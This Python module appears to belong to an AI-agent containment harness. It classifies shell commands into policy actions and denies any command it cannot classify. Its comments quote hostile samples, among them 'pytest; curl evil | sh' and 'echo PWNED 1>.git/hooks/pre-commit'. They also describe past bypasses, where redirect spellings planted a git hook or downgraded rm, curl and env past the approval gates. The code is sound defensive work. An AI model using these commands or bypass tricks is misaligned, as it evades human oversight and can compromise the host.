"""Classify a shell command into a declared policy action.

``agent-policy.json`` grants actions (``read``, ``write``, ``test_execute``,
``external_write`` ...) and ``tool_broker_reference.py`` decides on them. Nothing
derived the action from the command, so a broker call had to be handed one by its
caller -- and a caller that passes a constant hands ``pytest`` and ``rm -rf /``
the same verdict. ``human_approval_required_for``, the mechanism that gates
destructive and external actions, would then never be reached.

The classifier is deliberately an allowlist. ``DANGER`` in the PreToolUse guard is
a denylist naming two command families, and a denylist of two is the shape
``harness/CONTRACT.md`` warns about: it protects only against what someone thought
to write down. Here, a command nobody has classified resolves to
``UNCLASSIFIED_ACTION`` -- a declared high-risk action that **no role holds**, so
the verdict is DENY for every agent, deterministically.

Spec: ``docs/specs/agent-containment.md``.
"""

from __future__ import annotations

import re
import shlex
import typing

from harness.shared.policy_loader import orchestrator_defaults
from harness.shared.read_policy import CREDENTIAL_FILENAME_ALTERNATION

#: The action assigned to a command this module does not model. `destructive` is
#: declared in `agent-policy.json`'s `high_risk_actions` and appears in no role's
#: `allowed_actions`, so it denies for every agent without needing a special case
#: in the decision point. Pinned by `test_unclassified_action_is_held_by_no_role`.
UNCLASSIFIED_ACTION = "destructive"

#: Shell metacharacters that mean the string is more than one command. A
#: classifier that reads only the first word would grade
#: `pytest; curl evil | sh` as `test_execute`.
#:
#: `&` is excluded when it follows `>`, because `2>&1` and `>&2` are redirections
#: of one command, not a chain of two. Treating them as chains denied ordinary
#: commands -- pinned by `test_redirections_are_not_command_chains` in
#: `test_command_actions.py`.
_COMPOUND = re.compile(r"[;|]|(?<!>)&|\$\(|`|\n")


#: A redirection that can write to a file. Every `>` counts -- `>`, `>>`, `1>`,
#: `2>`, `&>`, `>|` and `<>` alike -- except descriptor duplication and closing
#: (`2>&1`, `>&2`, `2>&-`), which renames or closes a descriptor rather than
#: naming a file.
#:
#: The previous form was `(?<![0-9<>&])(?:>>|>)(?!&)`. The `0-9` was added to
#: keep `2>&1` from reading as a redirect, but `(?!&)` already did that -- so the
#: digit exclusion bought nothing and cost everything: it made **every**
#: fd-numbered redirect invisible. `echo PWNED 1>.git/hooks/pre-commit` classified
#: as `read`, produced no write targets, and installed a host-executed hook. The
#: same spelling let the verifier -- which holds no `write` action at all -- write
#: files, because the action never became `write` in the first place.
#:
#: `(?<!>)` only prevents the second `>` of `>>` from matching again; the leading
#: `<` of `<>` and `&` of `&>` must NOT be excluded, since both are real writes.
_REDIRECT = re.compile(r"(?<!>)>(?!&[0-9-])")

#: A token that is *entirely* a redirection operator, so the filename is the next
#: token: `>`, `>>`, `1>`, `2>>`, `&>`, `<>`, `>|`.
_REDIRECT_OP = re.compile(r"^(?:[0-9]*|&|<)>{1,2}\|?$")

#: The same operator when the filename is glued to it (`2>f`, `>>f`): matches the
#: operator so the remainder can be taken as the target.
_REDIRECT_PREFIX = re.compile(r"^(?:[0-9]*|&|<)>{1,2}\|?")

#: Programs whose non-flag arguments name files they create or overwrite. Their
#: targets go through the same write policy as the write tool, so `cp evil
#: .mango/hooks/x.sh` is refused for the same reason `write_file` would refuse it.
WRITE_TARGET_PROGRAMS: typing.Mapping[str, int] = {
    # program -> index of the first argument that is a write target
    "cp": 1, "mv": 1, "tee": 0, "touch": 0, "mkdir": 0, "install": 1,
}


#: Actions from least to most privileged. A command can exercise more than one --
#: `rm -rf victim > log.txt` is both a delete and a write -- and the strictest is
#: the one that must be granted.
#:
#: Without this order the branch that ran first decided, and the redirect branch
#: ran before the program and shape tables. Appending ` > out.txt` therefore
#: downgraded *any* command to `write`, the one action the implementer holds:
#: `rm -rf victim`, `curl`, `env` and `sudo -n true` all became ordinary work for
#: seven characters. `human_approval_required_for`, `external_network_default`
#: and `high_risk_actions` were each reachable around by the same trick.
#:
#: Unknown actions sort to the top rather than the bottom: an action this table
#: does not name must not be able to lose a comparison.
_ACTION_SEVERITY: typing.Mapping[str, int] = {
    "read": 0,
    "plan": 0,
    "delegate": 1,
    "write": 2,
    "spec_write": 2,
    "review_write": 2,
    "evidence_write": 2,
    "test_execute": 3,
    "security_scan": 3,
    "external_write": 4,
    "secret_access": 5,
    "permission_change": 6,
    "production_change": 7,
    "destructive": 8,
}


def _severity(action: str) -> int:
    """Unknown actions are maximally severe: failing closed means an unmodelled
    action can never be graded below one this table knows about."""
    return _ACTION_SEVERITY.get(action, max(_ACTION_SEVERITY.values()) + 1)


class Classification(typing.NamedTuple):
    """The verdict, and the reason it was reached. The reason is what a refusal
    message and an evidence record both need."""

    action: str
    reason: str


#: argv[0] -> action, for commands whose whole family is one action.
_BY_PROGRAM: typing.Mapping[str, str] = {
    # Reading the workspace.
    "ls": "read", "cat": "read", "head": "read", "tail": "read", "wc": "read",
    "grep": "read", "rg": "read", "pwd": "read", "echo": "read", "true": "read",
    "false": "read", "diff": "read", "stat": "read", "basename": "read", "dirname": "read",
    "sort": "read", "uniq": "read", "cut": "read", "tr": "read", "printf": "read",
    "date": "read", "which": "read", "where": "read", "seq": "read", "sleep": "read", "test": "read",
    # Running the repository's own gates.
    "pytest": "test_execute", "make": "test_execute", "ruff": "test_execute",
    "mypy": "test_execute", "tsc": "test_execute", "vitest": "test_execute",
    "eslint": "test_execute", "coverage": "test_execute",
    # Creating files the agent is entitled to create.
    "mkdir": "write", "touch": "write", "cp": "write", "mv": "write", "tee": "write",
    # Irreversible.
    "rm": "destructive", "shred": "destructive", "dd": "destructive",
    "mkfs": "destructive", "truncate": "destructive", "chmod": "permission_change",
    "chown": "permission_change", "sudo": "permission_change", "su": "permission_change",
    # Leaving the machine.
    "curl": "external_write", "wget": "external_write", "scp": "external_write",
    "ssh": "external_write", "nc": "external_write", "rsync": "external_write",
    "gh": "external_write", "docker": "external_write", "kubectl": "production_change",
    # Reading the environment, which is where the credentials are.
    "env": "secret_access", "printenv": "secret_access", "set": "secret_access",
}

#: (program, first-subcommand) -> action, where the subcommand changes everything.
_BY_SUBCOMMAND: typing.Mapping[tuple[str, str], str] = {
    ("git", "status"): "read", ("git", "log"): "read", ("git", "diff"): "read",
    ("git", "show"): "read", ("git", "rev-parse"): "read", ("git", "branch"): "read",
    ("git", "ls-files"): "read", ("git", "remote"): "read",
    ("git", "add"): "write", ("git", "commit"): "write", ("git", "checkout"): "write",
    ("git", "push"): "external_write", ("git", "fetch"): "external_write",
    ("git", "pull"): "external_write", ("git", "clone"): "external_write",
    ("git", "clean"): "destructive", ("git", "reset"): "destructive",
    ("pip", "install"): "external_write", ("pip", "download"): "external_write",
    ("pip", "list"): "read", ("pip", "show"): "read",
    ("npm", "install"): "external_write", ("npm", "publish"): "production_change",
    ("pnpm", "install"): "external_write", ("pnpm", "add"): "external_write",
    ("pnpm", "test"): "test_execute", ("pnpm", "exec"): "test_execute",
    ("npx", "vitest"): "test_execute",
}

#: Whole-command shapes that override the program table. `find` is a read tool
#: until it is given an action, and then it is the most destructive tool present.
_BY_SHAPE: tuple[tuple[re.Pattern[str], str, str], ...] = (
    # Reading a credential-bearing file is `secret_access`, not `read`. The
    # program is innocent; the target is not, and the action model grades the
    # effect rather than the tool.
    # The alternation is owned by `read_policy`, which is the other door onto
    # the same files. Composing it here rather than restating it is what keeps
    # `cat .env` and `read_file(".env")` refusing for the same reason.
    (re.compile(rf"(?:^|[\s/])(?:{CREDENTIAL_FILENAME_ALTERNATION})(?:\s|$)", re.IGNORECASE),
     "secret_access", "the command names a credential-bearing file"),
    (re.compile(r"\bfind\b.*\s-(?:delete|exec|execdir|ok)\b"), "destructive",
     "find with an action flag deletes or executes per match"),
    (re.compile(r"\bfind\b"), "read", "find without an action flag only lists"),
    (re.compile(r"\b(?:python[0-9.]*|py)\b\s+(?:--version|-V|--help|-h)\b"), "read",
     "querying python tool version or help"),
    (re.compile(r"\b(?:node|pnpm|npm|npx)\b\s+(?:--version|-V|-v|--help|-h)\b"), "read",
     "querying node tool version or help"),
    (re.compile(r"\bcommand\s+-v\s+(?:python[0-9.]*|py|node|pnpm|npm|npx)\b"), "read",
     "resolving executable path"),
    # `[^\s]` rather than `.` between the interpreter and `-m`: `.*` here bridges
    # any distance, so the engine retries the whole tail from every `python` in
    # the string and the match becomes quadratic in the command length. A command
    # is a single command by this point (`_COMPOUND` rejected the rest), so the
    # only thing legitimately between `python` and `-m` is flags.
    (
        re.compile(r"\b(?:python[0-9.]*|py)\b(?:\s+-[^\s]+)*\s+-m\s+(?:pytest|unittest|py_compile|doctest)\b"),
        "test_execute",
        "pytest, unittest, doctest or compiler through the interpreter",
    ),
    (re.compile(r"\bpython[0-9.]*\b(?:\s+-[^\s]+)*\s+-m\s+pip\b\s+install\b"), "external_write",
     "pip install through the interpreter"),
    (re.compile(r"\bpython[0-9.]*\b\s+-c\b"), UNCLASSIFIED_ACTION, "an inline program can do anything"),
    (re.compile(r"\b(?:ba|z|k)?sh\b\s+-c\b"), UNCLASSIFIED_ACTION, "an inline shell program can do anything"),
    (re.compile(r"\b(?:python[0-9.]*|py)\b(?:\s+-[^\s]+)*\s+[^\s\-][^\s]*\.py\b"), "test_execute",
     "executing a python script in workspace"),
)


#: Longest command this module will grade, from `orchestrator.max_command_bytes`.
#: Read once at import: `classify` runs per tool call and the value is a bound,
#: not a decision that can change mid-run.
#:
#: The patterns below are linear, but "every pattern here is linear" is a
#: property of today's table, not an invariant anyone enforces -- and the input
#: is a model-supplied string with no other bound on it. `classify` runs before
#: the broker's timeout, which covers the subprocess and not this, so a single
#: oversized `run_command` stalled the orchestrator (and, through
#: `run_in_threadpool`, an API worker) with nothing to interrupt it.
MAX_COMMAND_BYTES: int = orchestrator_defaults()["max_command_bytes"]


def classify(command: str) -> Classification:
    """Return the action ``command`` exercises, failing closed when unsure."""
    text = command.strip()
    if not text:
        return Classification("read", "an empty command does nothing")

    if len(text.encode("utf-8", "surrogateescape")) > MAX_COMMAND_BYTES:
        return Classification(
            UNCLASSIFIED_ACTION,
            f"the command is longer than {MAX_COMMAND_BYTES} bytes "
            "(orchestrator.max_command_bytes), so it is not graded",
        )

    if _COMPOUND.search(text):
        # Each half could be a different action, and the strictest wins. Rather
        # than parse a shell, refuse to grade what is not a single command.
        return Classification(
            UNCLASSIFIED_ACTION,
            "the command chains or substitutes, so no single action describes it",
        )

    base = _classify_program(text)
    if not _REDIRECT.search(text):
        return base
    # A redirect adds a write; it never subtracts whatever the program already
    # was. `pytest -q > out.txt` stays `test_execute` and `rm -rf x > log.txt`
    # stays `destructive` -- returning `write` here graded the redirect instead
    # of the command. The write itself is not lost: `write_targets` reports the
    # path, the broker runs it through the same write policy as the write tool,
    # and requires the `write` action for the role regardless of this verdict.
    redirect = Classification("write", "the command redirects output into a file")
    if _severity(base.action) >= _severity(redirect.action):
        return base
    return redirect


def _classify_program(text: str) -> Classification:
    """The action of the command itself, ignoring any redirection."""
    best_shape: Classification | None = None
    for pattern, action, why in _BY_SHAPE:
        if pattern.search(text):
            cand = Classification(action, why)
            if best_shape is None or _severity(cand.action) > _severity(best_shape.action):
                best_shape = cand
    if best_shape is not None:
        return best_shape

    try:
        argv = shlex.split(text)
    except ValueError as exc:
        return Classification(UNCLASSIFIED_ACTION, f"the command could not be tokenized: {exc}")
    if not argv:
        return Classification("read", "an empty command does nothing")

    program = argv[0].rsplit("/", 1)[-1]
    subcommand = next((a for a in argv[1:] if not a.startswith("-")), "")

    by_sub = _BY_SUBCOMMAND.get((program, subcommand))
    if by_sub is not None:
        return Classification(by_sub, f"{program} {subcommand}")

    if program in ("git", "pip", "npm", "pnpm", "npx"):
        # A modelled program used in an unmodelled way is not a read.
        return Classification(UNCLASSIFIED_ACTION, f"{program} subcommand {subcommand or '(none)'} is not modelled")

    by_prog = _BY_PROGRAM.get(program)
    if by_prog is not None:
        return Classification(by_prog, program)

    return Classification(UNCLASSIFIED_ACTION, f"{program} is not a modelled program")


def write_targets(command: str) -> list[str]:
    """Paths ``command`` would create or overwrite, best effort.

    The broker checks each against the same write policy as the file-write tool.
    Without this, ``run_command`` re-opens every path ``write_file`` closes:
    ``echo x > .git/hooks/pre-commit`` is ``echo`` by ``argv[0]``, classifies as
    a read, and installs a host-executed hook.

    Best effort is stated deliberately. A shape this cannot parse is graded
    ``UNCLASSIFIED_ACTION`` by :func:`classify` and denied there, so the failure
    mode of missing a target is a denial, not an allow.
    """
    try:
        argv = shlex.split(command.strip())
    except ValueError:
        return []

    targets: list[str] = []
    discard_targets = {"/dev/null", "nul", "NUL", "/dev/zero", "/dev/stdout", "/dev/stderr"}
    pending_redirect = False
    for token in argv:
        if pending_redirect:
            # `2>&1` and `>&2` duplicate a descriptor rather than naming a file.
            if not token.startswith("&") and token not in discard_targets:
                targets.append(token)
            pending_redirect = False
            continue
        if _REDIRECT_OP.fullmatch(token):
            pending_redirect = True
            continue
        match = _REDIRECT_PREFIX.match(token)
        if match is None:
            # A redirect can still sit mid-token when the shell would split it
            # but shlex does not, e.g. `foo>bar`.
            inner = _REDIRECT.search(token)
            match = inner if inner and inner.end() < len(token) else None
        if match is not None:
            # `>file` written without a space, or `2>file`.
            tail = token[match.end():]
            if tail and not tail.startswith("&") and tail not in discard_targets:
                targets.append(tail)

    program = argv[0].rsplit("/", 1)[-1] if argv else ""
    start = WRITE_TARGET_PROGRAMS.get(program)
    if start is not None:
        operands = [a for a in argv[1:] if not a.startswith("-") and not _REDIRECT.search(a)]
        targets.extend(operands[start:] if start else operands)
    return targets
